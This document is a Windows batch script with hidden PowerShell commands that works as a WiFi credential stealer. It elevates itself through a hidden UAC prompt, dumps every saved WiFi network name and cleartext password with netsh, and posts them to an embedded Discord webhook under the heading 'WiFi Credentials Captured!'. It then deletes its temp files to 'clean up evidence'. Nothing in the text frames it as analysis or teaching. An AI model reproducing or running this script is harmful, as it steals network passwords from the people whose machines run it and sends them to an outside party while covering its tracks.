@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    REM Extract WiFi credentials
    set filepath=%TEMP%\wifi_creds_%random%.txt
    
    REM Get WiFi credentials only - write to file
    powershell -WindowStyle Hidden -Command "$output = ''; netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {$name = ($_ -split ':')[1].Trim(); $pass = (netsh wlan show profile name=$name key=clear | Select-String 'Key Content'); if($pass) {$passValue = ($pass -split ':')[1].Trim()} else {$passValue = 'No password'}; $output += \"WiFi: $name`nPassword: $passValue`n---`n\"}; $output | Out-File $env:TEMP\wifi_creds_%random%.txt -Encoding utf8"
    
    REM Wait a moment for file to be written
    timeout /t 2 /nobreak >nul
    
    REM Send to Discord webhook - read from the SAME file
    powershell -WindowStyle Hidden -Command "try { $filepath = Get-ChildItem $env:TEMP\wifi_creds_*.txt | Select-Object -First 1 -ExpandProperty FullName; $content = Get-Content $filepath -Raw; if(!$content) { $content = 'Error: No WiFi data found' }; if($content.Length -gt 1800) { $content = $content.Substring(0,1800) + '...(truncated)' }; $payload = @{ content = '**WiFi Credentials Captured!**```' + $content + '```' } | ConvertTo-Json; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1429779133390655518/kwm5qXhLKjdU7mDgojljDCPiiMsBqvsmJPdn3TvhLQ4mAg9nyfmLV6ShWfCNN-yHntCt' -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' } catch { }"
    
    REM Clean up evidence
    timeout /t 1 /nobreak >nul
    del "%TEMP%\wifi_creds_*.txt" /q 2>nul
    del C:\wifi_credentials.txt /q 2>nul
    exit /b
) else (
    REM Request admin privileges
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)
